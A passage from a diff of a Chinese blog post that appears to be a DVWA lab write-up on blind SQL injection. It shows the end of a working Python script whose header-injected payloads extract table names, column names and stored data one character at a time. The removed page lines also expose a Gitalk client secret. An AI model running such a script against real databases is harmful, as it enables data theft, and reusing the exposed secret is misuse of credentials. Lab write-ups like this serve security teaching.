class="keyword">if</span> len(self.database) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\n can not get the database"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_num</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.table_num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select count(table_name)a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)#"</span>.format(str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the table_num"</span>)           </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_length'</span>,i,<span class="number">50</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)#"</span>.format(str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_length[<span class="number">0</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.table_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_table_name'</span>.format(i),j,<span class="number">50</span>)</span><br><span class="line">                payload = <span class="string">"1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a=&#123;1&#125;)#"</span>.format(str(i),str(j))</span><br><span class="line">                html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,name)</span><br><span class="line">            self.table_name.append(name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_num</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        self.column_num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)#"</span>.format(table_name,str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.column_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_length</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_length'</span>,i,<span class="number">100</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)#"</span>.format(table_name,str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.column_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_name</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.column_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_column_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                payload = <span class="string">"1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='&#123;1&#125;' having a=&#123;2&#125;)#"</span>.format(str(i),table_name,str(j))</span><br><span class="line">                html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) == self.column_length[<span class="number">0</span>]:</span><br><span class="line">            self.column_name.append(name)</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_name[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_num</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_word_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select count(&#123;0&#125;) as a from &#123;1&#125; having a=&#123;2&#125;)#"</span>.format(column_name,table_name,str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.word_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.word_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word_num'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_length</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">            self.process(<span class="string">'get_&#123;0&#125;_length'</span>.format(column_name),i,<span class="number">200</span>)</span><br><span class="line">            payload = <span class="string">"1' and (select length(group_concat(&#123;0&#125;)) as a from &#123;1&#125; having a=&#123;2&#125;)#"</span>.format(column_name,table_name,str(i))</span><br><span class="line">            html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.word_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.word_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word length'</span>) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_name</span><span class="params">(self,table_name,column_name,word_num)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.word_length[word_num]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'get_&#123;0&#125;_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                payload = <span class="string">"1' and (select ascii(substring(group_concat(&#123;0&#125;),&#123;1&#125;,1)) as a from &#123;2&#125; having a=&#123;3&#125;)#"</span>.format(column_name,str(i),table_name,str(j))</span><br><span class="line">                html = self.s.get(self.url,headers=self.get_headers(payload)).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        self.word_name.append(name)</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.word_name[word_num])</span><br></pre></td></tr></table></figure>
 
 
-  </article>
+      
+    </div>
+    
+  </div>
   
     
-<div class="nexmoe-post-copyright">
-<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
-<strong>Author：</strong>huahua<br>
-<strong>Link：</strong><a href="https://1187100546.github.io/2019/11/12/DVWA-SQL-Injection-Blind/" title="https://1187100546.github.io/2019/11/12/DVWA-SQL-Injection-Blind/" target="_blank" rel="noopener">https://1187100546.github.io/2019/11/12/DVWA-SQL-Injection-Blind/</a><br>
-
-  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
-
-</div>
-
-
-  
-  <section class="nexmoe-comment">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
-<div id="gitalk"></div>
-<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
-<script type="text/javascript">
-    var gitalk = new Gitalk({
-        clientID: '80b2453b6d5f37ad6225',
-        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
-        id: window.location.pathname,
-        repo: 'nexmoe.github.io',
-        owner: 'nexmoe',
-        admin: 'nexmoe'
-    })
-    gitalk.render('gitalk')
-</script>
-</section>
-</div>
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/11/12/DVWA-SQL-Injection-Blind/">DVWA-SQL_Injection_Blind（sql盲注）</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">huahua</a></p>
+        <p><span>发布时间:</span>2019-11-12, 20:26:23</p>
+        <p><span>最后更新:</span>2019-11-13, 21:44:55</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/11/12/DVWA-SQL-Injection-Blind/" title="DVWA-SQL_Injection_Blind（sql盲注）">https://1187100546.github.io/2019/11/12/DVWA-SQL-Injection-Blind/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://1187100546.github.io/2019/11/12/DVWA-SQL-Injection-Blind/　　作者: huahua" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
     </div>
-  </div>
-  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
- 
-    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
 
 
- 
-    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
 
-
-<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
-<script>hljs.initHighlightingOnLoad();</script>
-
-<script src="/js/app.js?v=1578720655791"></script>
-<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
-
-
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
-
-
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/11/14/xss-reflected/">
+                    DVWA--xss_reflected
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/10/28/DVWA-SQL-Injection/">
+                    DVWA-SQL_Injection(SQL注入)
+                </a>
+            </div>
+        
+    </nav>
 
   
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#级别：low"><span class="toc-number">1.</span> <span class="toc-text">级别：low</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-Blind-Source"><span class="toc-number">1.1.</span> <span class="toc-text">SQL Injection (Blind) Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析："><span class="toc-number">1.2.</span> <span class="toc-text">分析：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取数据库长度"><span class="toc-number">1.4.</span> <span class="toc-text">获取数据库长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#检查页面是否正常"><span class="toc-number">1.5.</span> <span class="toc-text">检查页面是否正常</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取数据库名"><span class="toc-number">1.6.</span> <span class="toc-text">获取数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取表长"><span class="toc-number">1.7.</span> <span class="toc-text">获取表长</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取表名"><span class="toc-number">1.8.</span> <span class="toc-text">获取表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取表列数量"><span class="toc-number">1.9.</span> <span class="toc-text">获取表列数量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取总长度"><span class="toc-number">1.10.</span> <span class="toc-text">获取总长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取列名"><span class="toc-number">1.11.</span> <span class="toc-text">获取列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取字段数目"><span class="toc-number">1.12.</span> <span class="toc-text">获取字段数目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取列长"><span class="toc-number">1.13.</span> <span class="toc-text">获取列长</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取数据"><span class="toc-number">1.14.</span> <span class="toc-text">获取数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#级别：medium"><span class="toc-number">2.</span> <span class="toc-text">级别：medium</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-Blind-Source-1"><span class="toc-number">2.1.</span> <span class="toc-text">SQL Injection (Blind) Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">2.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#级别：high"><span class="toc-number">3.</span> <span class="toc-text">级别：high</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-Blind-Source-2"><span class="toc-number">3.1.</span> <span class="toc-text">SQL Injection (Blind) Source</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-1"><span class="toc-number">3.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整脚本"><span class="toc-number">4.</span> <span class="toc-text">完整脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#low"><span class="toc-number">4.1.</span> <span class="toc-text">low:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#medium"><span class="toc-number">4.2.</span> <span class="toc-text">medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#high"><span class="toc-number">4.3.</span> <span class="toc-text">high</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-6 i,
+        .toc-level-6 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"DVWA-SQL_Injection_Blind（sql盲注）　| 花花的blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
 
 
 
 
 
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/11/14/xss-reflected/" title="上一篇: DVWA--xss_reflected">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/10/28/DVWA-SQL-Injection/" title="下一篇: DVWA-SQL_Injection(SQL注入)">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/01/03/des/">分组密码DES</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/03/lsfr/">序列密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/03/gudianmima/">古典密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/03/java-4/">java第四次实验作业</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/01/03/java-3/">java第三次实验作业</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/30/java-2/">java第二次实验作业</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/29/java-fujia/">java继承实现多态的例子</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/26/java-shiyan-3/">java实验三</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/26/java-shiyan-2/">java实验二</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/24/spawn-failed/">hexo发生error：spawn failed错误的解决方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/19/网安作业3/">网安作业3</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/14/xss-stored/">DVWA--xss_stored</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/14/xss-reflected/">DVWA--xss_reflected</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/12/DVWA-SQL-Injection-Blind/">DVWA-SQL_Injection_Blind（sql盲注）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/28/DVWA-SQL-Injection/">DVWA-SQL_Injection(SQL注入)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/28/算法实验考试/">算法实验考试</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/26/算法实验作业/">算法实验作业</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/25/算法实验4/">算法实验（四）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/24/算法实验3/">算法实验（三）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/算法实验2/">算法实验（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/22/Brute_Force/">DVWA-Brute_Force暴力破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/22/算法实验1/">算法实验（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/21/算法作业2/">算法作业（二）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/20/算法作业1/">算法作业（一）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/13/XSS攻击简单示例/">XSS攻击简单示例</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/13/教育部取消毕业前补考的意见/">教育部取消毕业前补考的意见(某人的毛概作业)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/13/利用sqlmap注入dvwa/">利用sqlmap注入dvwa</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/12/简单sql注入环境搭建及注入/">简单sql注入环境搭建及注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/11/msf攻击windows/">msf攻击windows</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/11/一天是不良人，一辈子都是不良人/">一天是不良人，一辈子都是不良人</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/10/hello-world/">Hello World</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2020 huahua
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+            
+            
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
 </body>
-
 </html>
